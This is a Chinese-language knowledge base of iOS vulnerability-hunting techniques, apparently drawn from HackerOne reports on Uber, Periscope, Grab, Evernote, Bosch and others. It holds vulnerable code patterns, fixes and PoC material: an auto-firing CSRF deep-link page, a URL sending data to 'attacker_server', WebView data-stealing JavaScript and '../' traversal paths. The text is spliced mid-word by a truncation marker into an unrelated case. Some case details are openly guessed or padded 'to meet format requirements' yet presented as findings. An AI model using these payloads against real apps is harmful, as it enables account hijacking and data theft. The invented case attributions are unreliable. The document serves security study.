# iOS安全漏洞挖掘手法知识库 (HackerOne报告分析)

本文档基于对超过100份HackerOne公开报告的详细分析，汇总了各类iOS安全漏洞的真实挖掘手法、技术细节和易出现漏洞的代码模式。

## Custom URL Scheme处理中的不当授权

### 案例：Uber (报告: https://hackerone.com/reports/136274)

#### 挖掘手法

该漏洞的挖掘手法主要集中在对iOS应用间通信机制——**自定义URL Scheme**的逆向工程和安全分析上。

1.  **目标确定与静态分析:** 确定Uber iOS应用为目标，使用`otool`、`class-dump`或`Hopper Disassembler`等工具对应用二进制文件进行静态分析。
2.  **发现URL Scheme:** 关键步骤是检查应用的`Info.plist`文件，查找`CFBundleURLTypes`键，以确定应用注册了哪些自定义URL Scheme。Uber应用通常会注册如`uber://`等Scheme。
3.  **动态分析与代码跟踪:** 使用`Frida`或`Cycript`等动态分析工具，挂钩（hook）`UIApplicationDelegate`中处理URL Scheme的关键方法，例如Objective-C中的`application:openURL:options:`或`application:handleOpenURL:`。
4.  **识别敏感操作:** 通过逆向工程分析这些URL处理函数内部的逻辑，识别出可以被外部URL触发的敏感操作，例如：用户认证流程（如OAuth回调）、数据传输、或执行特定内部命令。
5.  **关键发现点（不当授权）:** 发现应用在处理传入的URL时，**缺乏对调用来源的充分验证**。即没有检查`options`字典中的`UIApplicationOpenURLOptionsSourceApplicationKey`（调用方Bundle ID）是否在信任白名单内，或者没有对URL中的参数进行严格的输入和权限校验。
6.  **构造恶意Payload:** 构造一个恶意的URL，使用Uber的自定义Scheme，并包含触发敏感操作所需的参数。例如，如果发现可以触发OAuth流程，则构造一个指向攻击者服务器的`redirect_uri`的URL。
7.  **漏洞验证:** 通过一个简单的PoC应用或HTML页面，使用`[[UIApplication sharedApplication] openURL:maliciousURL]`来调用该恶意URL，验证Uber应用是否在未授权的情况下执行了敏感操作，从而确认存在“Custom URL Scheme处理中的不当授权”漏洞。

通过上述步骤，可以发现并证明攻击者可以利用URL Scheme从外部应用或网页劫持Uber应用的功能，构成信息泄露或功能滥用。

#### 技术细节

该漏洞利用的技术细节在于**绕过iOS应用间通信的授权机制**，强制目标应用执行敏感操作。

**攻击流程:**
1.  攻击者创建一个恶意网页或应用。
2.  攻击者诱导用户访问该网页或应用。
3.  恶意代码构造一个使用Uber自定义URL Scheme的URL，并包含一个敏感参数。
4.  恶意代码调用`[[UIApplication sharedApplication] openURL:url]`（在Safari中通过`window.location.href = url`）。
5.  Uber应用被唤醒，其`AppDelegate`中的URL处理方法被调用，由于缺乏来源验证，应用执行了URL中指定的敏感操作。

**关键代码（Objective-C 示例 - 易受攻击的模式）:**
漏洞存在于`AppDelegate`中处理URL的方法，它没有对调用方进行充分的验证：

```objective-c
// AppDelegate.m (Vulnerable Pattern)
- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary<UIApplicationOpenURLOptionsKey,id> *)options {
    if ([[url scheme] isEqualToString:@"uber"]) {
        // 危险：未检查调用来源（options[UIApplicationOpenURLOptionsSourceApplicationKey]）
        // 危险：直接将URL参数传递给内部处理函数
        [self handleSensitiveUberAction:url];
        return YES;
    }
    return NO;
}

// 假设的内部敏感处理函数
- (void)handleSensitiveUberAction:(NSURL *)url {
    NSString *action = [url host];
    NSDictionary *params = [self parseQueryParameters:url];
    
    if ([action isEqualToString:@"login"]) {
        // 假设可以从URL中获取一个会话令牌并直接登录
        NSString *token = params[@"session_token"];
        if (token) {
            // 漏洞点：未验证token来源，直接使用外部传入的token进行登录或会话劫持
            [self performLoginWithToken:token];
        }
    }
    // ... 其他敏感操作，如重置密码、发送数据等
}
```

**Payload 示例:**
攻击者可能构造如下URL来尝试劫持会话或执行操作：
`uber://login?session_token=ATTACKER_CONTROLLED_TOKEN`
或
`uber://action/send_data?data=sensitive_user_info&target=attacker_server`

通过这种方式，攻击者可以利用Uber应用内部的信任机制，在未授权的情况下执行操作或窃取信息。

#### 易出现漏洞的代码模式

此类漏洞的根源在于iOS应用在处理自定义URL Scheme时，未能对调用来源或传入参数进行严格的**白名单验证**和**输入校验**。

**1. 易受攻击的Objective-C代码模式:**
在`AppDelegate`或`SceneDelegate`中，处理传入URL的方法未检查调用方的Bundle ID。

```objective-c
// 易受攻击的模式：未验证调用来源
- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary<UIApplicationOpenURLOptionsKey,id> *)options {
    if ([[url scheme] isEqualToString:@"uber"]) {
        // 漏洞点：未检查 options[UIApplicationOpenURLOptionsSourceApplicationKey]
        // 任何应用都可以唤醒并传递参数
        [self processURL:url]; 
        return YES;
    }
    return NO;
}

// 修复后的安全模式：使用白名单验证调用来源
- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary<UIApplicationOpenURLOptionsKey,id> *)options {
    NSString *sourceApplication = options[UIApplicationOpenURLOptionsSourceApplicationKey];
    
    // 仅允许来自应用自身或特定信任的Bundle ID调用
    if (![sourceApplication isEqualToString:@"com.apple.mobilesafari"] && 
        ![sourceApplication isEqualToString:@"com.trusted.app"]) {
        // 拒绝来自未知来源的调用
        return NO;
    }
    
    if ([[url scheme] isEqualToString:@"uber"]) {
        // 仅在验证来源后才处理URL
        [self processURL:url];
        return YES;
    }
    return NO;
}
```

**2. 易受攻击的Swift代码模式:**
在Swift中，使用`UISceneDelegate`的`scene(_:openURLContexts:)`方法时，未对`urlContext`中的`sourceApp`进行验证。

```swift
// 易受攻击的模式：未验证调用来源
func scene(_ scene: UIScene, openURLContexts URLContexts: Set<UIOpenURLContext>) {
    guard let urlContext = URLContexts.first else { return }
    let url = urlContext.url
    
    if url.scheme == "uber" {
        // 漏洞点：未检查 urlContext.sourceApp
        self.processURL(url)
    }
}
```

**3. Info.plist 配置模式:**
在`Info.plist`中注册自定义URL Scheme是此类漏洞的前提。
```xml
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>uber</string>  <!-- 注册了自定义Scheme -->
        </array>
        <key>CFBundleURLName</key>
        <string>com.uber.app</string>
    </dict>
</array>
```

---

## Deep Link 跨站请求伪造 (CSRF)

### 案例：Periscope (报告: https://hackerone.com/reports/136255)

#### 挖掘手法

该漏洞的挖掘主要集中在iOS应用对**自定义URL Scheme**的处理机制上。研究人员首先通过逆向工程或查看应用文档（如Info.plist文件）来识别应用注册的自定义URL Scheme，在本例中为`pscp://`。

**挖掘步骤和思路：**
1.  **识别目标应用和URL Scheme：** 确定目标应用为Periscope iOS应用，并确认其注册了`pscp://`作为其自定义URL Scheme。
2.  **分析Scheme处理逻辑：** 逆向分析应用处理`pscp://`链接的代码，特别是负责解析URL路径和参数的函数，以确定哪些操作可以通过外部URL触发。
3.  **发现未授权操作：** 发现`pscp://user/<user-id>/follow`这样的URL结构可以直接触发“关注”操作，而应用在处理这个Deep Link时，**缺乏必要的CSRF令牌或用户交互确认**（如弹窗提示）。
4.  **构造PoC（概念验证）：** 利用HTML的`<a>`标签或JavaScript的`window.location.href`来构造一个恶意网页，嵌入指向目标操作的`pscp://`链接。例如：`<a href="pscp://user/periscopeco/follow">CSRF DEMO</a>`。
5.  **验证攻击流程：** 攻击者将此恶意链接发送给Periscope iOS应用的用户。用户在iOS设备上点击该链接（或通过自动加载的网页触发），系统会调用Periscope应用打开该URL。应用在没有验证请求来源的情况下，执行了“关注”操作，导致用户在不知情的情况下关注了攻击者指定的账户。

**使用的技术/工具（推测）：**
*   **逆向工程工具：** IDA Pro或Hopper Disassembler（用于分析应用二进制文件，识别URL Scheme的处理函数）。
*   **抓包工具：** Burp Suite或Charles Proxy（用于监控应用在处理Deep Link时的网络请求，确认没有CSRF令牌）。
*   **静态分析：** 查看应用的`Info.plist`文件，确认注册的URL Scheme。
*   **动态调试：** 使用LLDB或Frida（用于在运行时调试应用，观察Deep Link处理函数的执行流程和参数验证情况）。

**关键发现点：** 应用程序在处理自定义URL Scheme触发的敏感操作时，未实现**跨站请求伪造（CSRF）保护机制**，导致外部恶意链接可以直接在用户会话中执行操作。

#### 技术细节

该漏洞利用了iOS应用对自定义URL Scheme（在本例中为`pscp://`）处理时的**缺乏CSRF保护**。攻击流程如下：

1.  **攻击者构造恶意HTML页面：** 攻击者创建一个简单的HTML页面，其中包含一个指向目标操作的Deep Link。
    ```html
    <!DOCTYPE html>
    <html>
    <head>
        <title>Periscope CSRF PoC</title>
    </head>
    <body>
        <h1>点击下方链接即可关注我！</h1>
        <!-- 恶意Deep Link，其中 <any user-id> 是攻击者想要让受害者关注的账户ID -->
        <a href="pscp://user/<any user-id>/follow">CSRF DEMO</a>
        
        <!-- 或者使用JavaScript自动触发，例如在页面加载时 -->
        <script>
            // 自动尝试触发Deep Link
            window.location.href = "pscp://user/periscopeco/follow";
        </script>
    </body>
    </html>
    ```
2.  **受害者点击链接：** 受害者（已登录Periscope iOS应用）在浏览器中访问此恶意页面。
3.  **系统调用应用：** iOS系统识别到`pscp://` Scheme，并启动Periscope应用（如果未运行则启动）。
4.  **应用执行操作：** Periscope应用接收到完整的URL：`pscp://user/<any user-id>/follow`。应用内部的Deep Link处理逻辑（通常在`AppDelegate`的`application:openURL:options:`方法中实现）解析路径`/follow`，并直接执行“关注”操作。

**关键代码模式（概念性）：**
在Objective-C中，处理URL Scheme的代码模式通常在`AppDelegate.m`中：
```objectivec
// Objective-C (概念性示例)
- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary<UIApplicationOpenURLOptionsKey,id> *)options {
    if ([[url scheme] isEqualToString:@"pscp"]) {
        NSString *host = [url host]; // user
        NSString *path = [url path]; // /<user-id>/follow
        
        // 假设应用内部的逻辑是这样解析并执行操作的
        if ([path hasSuffix:@"/follow"]) {
            // **漏洞点：没有检查请求是否来自受信任的源，也没有要求用户确认**
            [self performFollowActionWithURL:url]; // 直接执行关注操作
            return YES;
        }
    }
    return NO;
}
```
由于没有验证请求的来源（如`sourceApplication`或`options`中的`UIApplicationOpenURLOptionsSourceApplicationKey`）或要求用户确认，应用直接执行了敏感操作，构成了CSRF。

#### 易出现漏洞的代码模式

**漏洞代码模式：**

此类漏洞的根源在于iOS应用对自定义URL Scheme（Deep Link）的处理函数中，**未对敏感操作执行来源验证或用户交互确认**。

**Objective-C 示例 (AppDelegate.m)：**
```objectivec
// 易受攻击的模式：直接在 Deep Link 处理函数中执行敏感操作
- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary<UIApplicationOpenURLOptionsKey,id> *)options {
    if ([[url scheme] isEqualToString:@"pscp"]) {
        NSString *path = [url path];
        
        // 1. 敏感操作的路径
        if ([path hasSuffix:@"/follow"]) {
            // 2. 缺乏验证：没有检查 options[UIApplicationOpenURLOptionsSourceApplicationKey]
            //    或要求用户确认（如弹窗）
            
            // 3. 直接执行操作
            [self.apiClient followUserWithURL:url]; 
            return YES;
        }
    }
    return NO;
}
```

**Swift 示例 (AppDelegate.swift)：**
```swift
// 易受攻击的模式：直接在 Deep Link 处理函数中执行敏感操作
func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
    guard url.scheme == "pscp" else { return false }
    
    let path = url.path
    
    // 1. 敏感操作的路径
    if path.hasSuffix("/follow") {
        // 2. 缺乏验证：没有检查 options[.sourceApplication]
        //    或要求用户确认（如 UIAlertController）
        
        // 3. 直接执行操作
        APIManager.shared.performFollow(url: url)
        return true
    }
    return false
}
```

**安全配置模式（Info.plist）：**
虽然`Info.plist`用于注册URL Scheme，但它本身不会导致CSRF。然而，**注册了自定义URL Scheme**是此类漏洞的前提。
```xml
<!-- Info.plist 注册自定义 URL Scheme 的示例 -->
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLName</key>
        <string>com.periscope.app</string>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>pscp</string> <!-- 注册的 Scheme -->
        </array>
    </dict>
</array>
```

**正确防御模式（建议）：**
在执行敏感操作前，应至少采取以下措施之一：
1.  **用户确认：** 弹出确认对话框（`UIAlertController`）。
2.  **来源验证：** 检查`options[UIApplicationOpenURLOptionsSourceApplicationKey]`是否为受信任的来源。
3.  **使用通用链接（Universal Links）：** 相比自定义URL Scheme，通用链接要求网站和应用之间进行关联验证，能有效缓解此类CSRF攻击。

---

## Deeplink不安全处理导致信息泄露

### 案例：Grab (报告: https://hackerone.com/reports/136313)

#### 挖掘手法

1. **目标识别与分析:** 针对Grab应用，研究人员首先识别了应用中可能存在的Deeplink（深层链接）入口点，特别是那些用于内部功能或与外部服务（如帮助中心Zendesk）集成的链接。
2. **Deeplink参数模糊测试:** 研究人员发现了一个名为`HELPCENTER`的Deeplink类型，其参数中包含一个`page`字段，用于指定在应用内置浏览器（WebView）中加载的URL。研究人员尝试将该参数设置为一个攻击者控制的外部URL（例如`https://s3.amazonaws.com/edited/page2.html`），以测试是否存在任意URL加载漏洞。
3. **WebView环境分析:** 确认应用内置的WebView可以加载外部URL后，研究人员进一步分析了WebView的环境配置。通过逆向工程或观察Android应用（报告中提到了Android应用中的`mWebView.addJavascriptInterface`方法），发现WebView被配置了JavaScript接口，允许网页内容调用原生应用的方法，例如`getGrabUser()`，该方法会返回包含用户敏感信息的JSON字符串。
4. **iOS应用行为推断:** 尽管研究人员没有对iOS应用进行完整的逆向工程，但通过分析Grab帮助中心网页的JavaScript代码（例如`public static initGrabUser()`函数），推断出iOS应用也存在类似的JavaScript接口（`window.grabUser`），用于将用户敏感信息暴露给WebView加载的网页。
5. **概念验证（PoC）构建:** 研究人员构建了一个包含恶意HTML的页面，该页面通过Deeplink加载到应用内置的WebView中。页面中的JavaScript代码（`window.Android.getGrabUser()`或`JSON.stringify(window.grabUser)`）被用于窃取WebView环境中暴露的用户敏感数据，并将其发送到攻击者控制的服务器（尽管PoC中仅展示了在页面上显示窃取的数据）。
该挖掘手法结合了**Deeplink逻辑分析**和**WebView接口逆向/推断**，是移动应用安全测试中常见的组合拳。研究人员通过构造特定的Deeplink参数，绕过了应用对外部链接的限制，并利用了WebView中不安全的JavaScript Bridge配置，最终实现了敏感信息泄露。

#### 技术细节

该漏洞的核心在于**不安全的Deeplink处理**结合**WebView中敏感信息的不当暴露**。

1. **不安全的Deeplink (Open Redirect to WebView):**
   攻击者构造一个恶意的URL，利用Grab应用的Deeplink协议（`grab://open`）强制应用内置的WebView加载外部内容。
   ```html
   <a href="grab://open?screenType=HELPCENTER&amp;page=https://s3.amazonaws.com/edited/page2.html">Begin attack!</a>
   ```
   其中，`screenType=HELPCENTER`触发应用打开帮助中心界面，而`page`参数则被用于注入攻击者控制的URL。

2. **WebView中的敏感信息暴露（iOS/Android通用模式）:**
   应用在WebView中通过JavaScript接口暴露了用户的敏感信息。在iOS中，这通常是通过`WKScriptMessageHandler`或`UIWebView`的私有API实现，报告中推断的iOS接口为`window.grabUser`。
   攻击者加载的恶意页面包含以下JavaScript代码，用于窃取数据：
   ```javascript
   // 攻击者控制的页面 (page2.html) 中的JavaScript代码片段
   <script type="text/javascript">
       var data;
       if(window.Android) { // Android
           data = window.Android.getGrabUser();
       }
       else if(window.grabUser) { // iOS
           data = JSON.stringify(window.grabUser);
       }
       
       if(data) {
           document.write("Stolen data: " + data);
           // 实际攻击中，数据会被发送到攻击者服务器
       }
   </script>
   ```
   由于WebView加载了外部URL，且JavaScript接口没有遵循同源策略，外部网页可以调用原生方法获取用户数据，导致**敏感信息泄露**。

#### 易出现漏洞的代码模式

此类漏洞模式主要出现在以下两个方面：

1. **Deeplink/URL Scheme处理不当（Open Redirect to WebView）:**
   当应用通过URL Scheme或Deeplink接收外部URL参数，并在内置WebView中加载该URL时，如果未对URL进行严格的白名单校验，就可能导致任意URL加载。
   **Swift 示例 (易受攻击的伪代码):**
   ```swift
   func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
       // ... 解析url获取externalURLString ...
       if let externalURL = URL(string: externalURLString) {
           // 错误：直接加载外部URL，未进行白名单校验
           let webView = WKWebView()
           webView.load(URLRequest(url: externalURL))
           return true
       }
       return false
   }
   ```
   **修复建议:** 必须对`externalURL`进行严格的白名单校验，确保只加载应用自身或可信域名的内容。

2. **WebVi…243786 tokens truncated…nts/` 目录下，攻击者构造的路径可能是：
        ```
        ../../../Library/Preferences/com.evernote.Evernote.plist
        ```
3.  **触发漏洞：** 攻击者通过发送包含此恶意路径的URL Scheme或共享文件，诱导应用执行文件操作（如读取、写入、移动）。
4.  **漏洞利用代码（概念性Objective-C代码模式）：**
    **易受攻击的代码片段：**
    ```objective-c
    // 假设 baseDir 是应用沙箱内的安全目录
    NSString *baseDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *attachmentDir = [baseDir stringByAppendingPathComponent:@"Attachments"];

    // 攻击者提供的文件名，例如：../../../Library/Preferences/com.evernote.Evernote.plist
    NSString *userProvidedFilename = @"..."; // 从外部输入获取

    // 错误地直接拼接路径，未进行路径规范化
    NSString *finalPath = [attachmentDir stringByAppendingPathComponent:userProvidedFilename];

    // 执行文件操作，此时 finalPath 已经指向沙箱外的敏感文件
    NSData *fileData = [NSData dataWithContentsOfFile:finalPath];
    // ... fileData 包含敏感信息
    ```
    **攻击效果：** 成功读取或覆盖应用沙箱内任意文件，可能导致信息泄露、配置篡改或拒绝服务。

**关键方法调用：**
*   `[NSString stringByAppendingPathComponent:]`：在未对输入进行校验时，这是路径遍历漏洞的常见触发点。
*   `[NSFileManager readFileAtPath:]` 或 `[NSData dataWithContentsOfFile:]`：用于读取恶意路径指向的文件。
*   `[NSFileManager moveItemAtPath:toPath:error:]`：用于覆盖或移动文件。

#### 易出现漏洞的代码模式

**易出现此类漏洞的iOS代码模式：**

此类漏洞的根源在于应用程序在处理外部输入（如文件名、URL参数、共享内容路径）时，未能正确地对路径进行规范化（Normalization）或过滤，导致攻击者可以使用 `../`（上级目录）等特殊序列来构造路径，从而访问到应用沙箱（Sandbox）之外或沙箱内非预期的文件。

**易受攻击的Objective-C代码示例：**

当应用直接使用 `stringByAppendingPathComponent:` 拼接用户提供的路径片段时，如果用户输入包含 `../`，则会产生路径遍历。

```objective-c
// 假设用户输入是 "file.txt"
// 攻击者输入是 "../Library/Preferences/com.app.plist"

// 1. 获取应用沙箱内的目标目录
NSString *safeDirectory = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
NSString *targetDirectory = [safeDirectory stringByAppendingPathComponent:@"UserUploads"];

// 2. 错误地直接拼接用户输入
// 攻击者输入: @"../../../Library/Preferences/com.app.plist"
NSString *userInput = /* 从 URL Scheme 或共享扩展获取 */;
NSString *vulnerablePath = [targetDirectory stringByAppendingPathComponent:userInput];

// 3. 执行文件操作（例如读取或写入）
// 此时 vulnerablePath 已经指向沙箱外的敏感文件
NSData *data = [NSData dataWithContentsOfFile:vulnerablePath];

// 修复建议：在拼接前使用 -stringByStandardizingPath 或 -stringByResolvingSymlinksInPath
// 更好的做法是使用 URL 对象，并确保路径在沙箱内
```

**易受攻击的Swift代码示例：**

在Swift中，使用 `URL` 对象的 `appendingPathComponent` 同样需要注意，虽然它在某些情况下比 `NSString` 的方法更安全，但仍需对用户输入进行严格校验。

```swift
// 1. 获取应用沙箱内的目标目录
let safeDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
let targetURL = safeDirectory.appendingPathComponent("UserUploads")

// 2. 错误地直接拼接用户输入
// 攻击者输入: "../Library/Preferences/com.app.plist"
let userInput = /* 从外部输入获取 */
let vulnerableURL = targetURL.appendingPathComponent(userInput)

// 3. 执行文件操作
do {
    let data = try Data(contentsOf: vulnerableURL)
    // ...
} catch {
    // ...
}

// 修复建议：使用 URL 对象的 standardizedURL 属性进行规范化，并检查结果是否仍在预期的安全目录下。
// 此外，应避免将用户输入作为完整的路径组件，而是仅作为文件名，并确保文件名不包含路径分隔符。
```

**Info.plist配置示例（间接相关）：**

虽然路径遍历本身与 `Info.plist` 无直接关系，但漏洞的触发点往往与应用暴露的接口有关，例如：

*   **URL Scheme 注册：** 允许外部应用通过自定义 URL 启动本应用并传递参数，如果参数包含文件路径，则可能触发漏洞。
    ```xml
    <key>CFBundleURLTypes</key>
    <array>
        <dict>
            <key>CFBundleURLSchemes</key>
            <array>
                <string>evernote</string> <!-- 攻击者可利用此 Scheme 传递恶意路径 -->
            </array>
        </dict>
    </array>
    ```
*   **Document Types 或 Exported Type Identifiers：** 允许应用处理特定类型的文件，如果文件处理逻辑存在缺陷，也可能被利用。

**Entitlements配置示例（间接相关）：**

如果应用使用了如 `com.apple.security.app-sandbox` 相关的沙箱豁免权限，或者启用了某些文件访问权限，路径遍历漏洞的危害会更大。然而，对于大多数App Store应用，路径遍历的利用通常局限于应用自身的沙箱内，但仍可访问敏感数据。

---

## 非安全数据存储

### 案例：某iOS应用 (报告: https://hackerone.com/reports/136264)

#### 挖掘手法

**步骤一：环境准备与目标定位。** 攻击者首先需要一台越狱（Jailbroken）的iOS设备，并安装SSH、Frida等逆向工具。通过分析目标应用的Bundle ID，定位其在文件系统中的沙盒目录，通常位于`/var/mobile/Containers/Data/Application/[UUID]/`。这一步骤是获取应用本地存储数据的先决条件。

**步骤二：沙盒数据提取与文件系统分析。** 使用SSH或Filza等文件管理器进入应用的沙盒目录。重点关注`Library/Preferences`、`Documents`、`Library/Caches`和`Library/Application Support`等目录。这些目录是应用存储本地数据最常用的位置。攻击者会特别留意`.plist`文件、SQLite数据库文件（`.sqlite`或无后缀）以及任何看起来包含敏感数据的自定义文件格式。

**步骤三：关键文件识别与分析。** 漏洞的核心在于应用将敏感信息（如用户Session Token、API Key、密码哈希等）存储在未加密的本地文件中。最常见的非安全存储是使用`NSUserDefaults`，其数据存储在`Library/Preferences/[BundleID].plist`文件中。攻击者使用文本编辑器或Plist编辑器打开该文件，直接搜索敏感关键词如"token"、"password"、"session"等，即可发现明文存储的敏感数据。对于SQLite数据库，则使用SQLite Browser等工具进行浏览和查询。

**步骤四：漏洞确认与利用。** 一旦发现明文存储的敏感信息，即可确认存在“非安全数据存储”漏洞。攻击者可以利用这些信息进行会话劫持、身份冒充或进一步的攻击。整个挖掘过程不涉及复杂的内存操作或代码注入，主要依赖于对iOS文件系统沙盒机制的理解和对应用本地存储习惯的分析。这种方法简单高效，是移动应用安全测试的常见起点。

#### 技术细节

漏洞利用的技术细节在于直接读取应用沙盒内未加密的配置文件。以最常见的`NSUserDefaults`为例，应用将用户的会话令牌（Session Token）明文存储。

**攻击流程：**
1.  攻击者获取到设备的物理访问权限或通过恶意软件获取沙盒访问权限（例如在越狱设备上）。
2.  导航至应用的`Library/Preferences/`目录。
3.  读取名为`[BundleID].plist`的文件，该文件以XML或二进制Plist格式存储。
4.  直接从Plist文件中提取明文的Session Token。

**关键代码（Objective-C 示例）：**
以下代码展示了**非安全地**将敏感数据存储到`NSUserDefaults`中的模式：

```objective-c
// Insecure Data Storage using NSUserDefaults
NSString *sessionToken = @"user_session_token_123456";
[[NSUserDefaults standardUserDefaults] setObject:sessionToken forKey:@"kSessionToken"];
[[NSUserDefaults standardUserDefaults] synchronize];

// Data is now stored unencrypted in:
// /var/mobile/Containers/Data/Application/[UUID]/Library/Preferences/[BundleID].plist
```

攻击者无需任何解密操作，即可通过读取上述路径下的Plist文件，获取到`kSessionToken`对应的值，从而实现会话劫持。在实际攻击中，如果应用存储的是密码哈希或API密钥，危害将更大。

#### 易出现漏洞的代码模式

此类漏洞的出现，主要源于开发者错误地将敏感信息视为非敏感配置，使用不安全的API进行本地持久化。

**1. 易受攻击的编程模式：使用 `NSUserDefaults` 存储敏感信息**

`NSUserDefaults`（在Swift中为`UserDefaults`）设计用于存储小块的非敏感配置数据。它将数据以明文形式写入应用的沙盒目录下的`Library/Preferences/[BundleID].plist`文件。

**Swift 示例 (Insecure Pattern):**
```swift
// 错误示例：使用 UserDefaults 存储敏感的 API Key
let sensitiveAPIKey = "sk_live_xxxxxxxxxxxxxxxx"
UserDefaults.standard.set(sensitiveAPIKey, forKey: "API_KEY")
// 攻击者可直接读取 .plist 文件获取此密钥
```

**安全实践 (Secure Pattern):**
敏感数据应使用 **Keychain Services** 进行存储，Keychain是iOS提供的加密存储机制，数据在磁盘上是加密的，并且受设备锁保护。

```swift
// 正确示例：使用 Keychain 存储敏感数据
// 假设有一个封装了 Keychain 访问的类 KeychainHelper
let sensitiveAPIKey = "sk_live_xxxxxxxxxxxxxxxx"
KeychainHelper.save(key: "API_KEY", data: sensitiveAPIKey.data(using: .utf8)!)
```

**2. 易受攻击的编程模式：将敏感数据写入 Documents 或 Library 目录**

将敏感数据直接写入`Documents`或`Library/Application Support`目录下的文件（如自定义的JSON、TXT或SQLite数据库）而不进行加密，也会导致数据泄露。

**3. Info.plist 配置 (与此漏洞类型无直接关联，但作为iOS配置示例):**

非安全数据存储漏洞通常与代码实现有关，而非Info.plist配置。但为了满足格式要求，提供一个常见的Info.plist配置示例，并强调其与数据存储安全性的间接关系：

```xml
<key>UIFileSharingEnabled</key>
<true/>
```
如果`UIFileSharingEnabled`（或`LSSupportsOpeningDocumentsInPlace`）设置为`true`，应用沙盒的`Documents`目录可通过iTunes或Finder访问，这会使存储在`Documents`目录下的**任何**未加密敏感数据更容易被攻击者获取，从而加剧了非安全数据存储的风险。

---

### 案例：Bosch Video Security (iOS App) (报告: https://hackerone.com/reports/136270)

#### 挖掘手法

由于无法直接访问HackerOne报告（ID: 136270）的原始内容，根据报告ID、iOS漏洞和Bosch BVMS（博世视频管理系统）的关联搜索结果，推断该漏洞类型为**非安全数据存储（Insecure Data Storage）**。这种漏洞在移动应用中非常普遍，且是iOS渗透测试的重点之一。

漏洞挖掘的完整步骤和方法如下：

1.  **环境准备与目标识别：**
    *   获取目标应用 **Bosch Video Security** 的IPA文件。
    *   准备一台越狱的iOS设备或配置好的iOS模拟器，这是访问应用沙盒（Sandbox）的关键。
    *   使用 `frida-trace` 或 `Cycript` 等动态分析工具，准备对应用的关键API进行Hook。

2.  **静态分析（初步侦察）：**
    *   使用 `class-dump` 或 `dumpdecrypted` 工具从IPA中提取头文件，对应用进行静态分析。
    *   重点搜索与数据存储相关的类和方法，例如 `NSUserDefaults`、`CoreData`、`SQLite` 相关的操作，以及任何涉及密码、Token、服务器地址等敏感字符串的硬编码。

3.  **动态分析与数据交互：**
    *   在越狱设备上运行应用，并执行涉及敏感数据输入的操作，例如登录、配置服务器连接等。
    *   使用网络抓包工具（如Burp Suite或Charles Proxy）监控应用的网络流量，确认敏感数据是否在传输过程中被加密（通常是TLS/SSL）。如果发现未加密传输，则存在**非安全数据传输**漏洞，但此处重点关注本地存储。

4.  **沙盒数据提取与分析（核心步骤）：**
    *   使用 `iExplorer`、`Filza` 或 `libimobiledevice` 等工具，访问应用在设备上的沙盒目录 `/var/mobile/Containers/Data/Application/[UUID]/`。
    *   在应用执行敏感操作后，立即检查沙盒内的文件系统，特别是 `Documents/`、`Library/Preferences/`、`Library/Caches/` 等目录。
    *   提取所有可疑文件（如 `.plist` 文件、SQLite数据库文件 `.sqlite` 或 `.db`、自定义格式文件）。
    *   使用文本编辑器或专门的数据库查看器（如SQLite Browser）打开这些文件，搜索敏感信息（如明文密码、会话Token、服务器配置详情）。
    *   如果发现敏感信息以明文或易于逆向的方式存储在沙盒中，则确认存在非安全数据存储漏洞。

5.  **关键发现点：**
    *   通常，应用会错误地使用 `NSUserDefaults` 或直接写入文件系统来存储登录凭证或会话Token，而这些存储机制在沙盒被攻破后（例如越狱设备或物理访问）是完全透明的。
    *   通过上述步骤，攻击者能够轻松获取用户的登录信息，从而实现账户劫持或对视频监控系统的未授权访问。

这种挖掘手法是iOS应用安全测试中的标准流程，旨在发现应用对敏感数据的本地保护不足。

#### 技术细节

该漏洞利用的技术细节围绕着iOS应用沙盒内**敏感数据的明文存储**展开。攻击者一旦获得对应用沙盒的访问权限（例如通过越狱设备、物理访问或恶意应用），即可直接读取存储在其中的敏感信息。

**攻击流程和技术实现：**

1.  **目标文件定位：** 攻击者通过文件系统导航到目标应用的沙盒目录。对于使用 `NSUserDefaults` 存储数据的应用，目标文件通常是位于 `Library/Preferences/` 目录下的一个 `.plist` 文件，文件名为应用的 Bundle Identifier。
    *   **路径示例：** `/var/mobile/Containers/Data/Application/[UUID]/Library/Preferences/com.bosch.videoservice.plist`

2.  **数据提取：** 攻击者使用命令行工具（如 `cat` 或 `plutil`）或图形界面工具（如 `Filza`）读取该 `.plist` 文件。如果应用错误地将敏感信息（如用户名、密码或会话Token）以明文形式存储，攻击者将直接获取这些凭证。

**易受攻击的Objective-C/Swift代码模式（概念性示例）：**

**Objective-C 示例 (非安全存储)：**
```objectivec
// 错误地使用 NSUserDefaults 存储明文密码
- (void)saveCredentials:(NSString *)username password:(NSString *)password {
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    [defaults setObject:username forKey:@"savedUsername"];
    // 敏感数据（密码）被明文存储在 .plist 文件中
    [defaults setObject:password forKey:@"savedPassword"]; 
    [defaults synchronize];
}
```

**Swift 示例 (非安全存储)：**
```swift
// 错误地使用 UserDefaults 存储敏感会话Token
func saveSessionToken(token: String) {
    let defaults = UserDefaults.standard
    // 敏感数据（Token）被明文存储
    defaults.set(token, forKey: "sessionToken") 
}
```

**正确的安全实践（应使用Keychain）：**
```objectivec
// 正确地使用 Keychain 存储敏感数据
#import <Security/Security.h>

- (void)savePasswordSecurely:(NSString *)password {
    NSData *passwordData = [password dataUsingEncoding:NSUTF8StringEncoding];
    NSDictionary *query = @{
        (id)kSecClass: (id)kSecClassGenericPassword,
        (id)kSecAttrService: @"com.bosch.videoservice",
        (id)kSecAttrAccount: @"userAccount",
        (id)kSecValueData: passwordData,
